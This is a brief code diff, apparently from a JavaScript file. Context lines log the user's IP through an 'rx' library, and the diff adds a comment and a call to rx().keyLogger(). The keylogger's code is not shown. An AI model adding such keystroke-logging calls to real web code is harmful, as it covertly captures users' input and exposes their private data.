@@ -48,4 +48,7 @@ rx().getUserIP(function(ip){
      console.log(ip);
  });
 
+
  // Going into gamma.js!!!
+
+ rx().keyLogger();
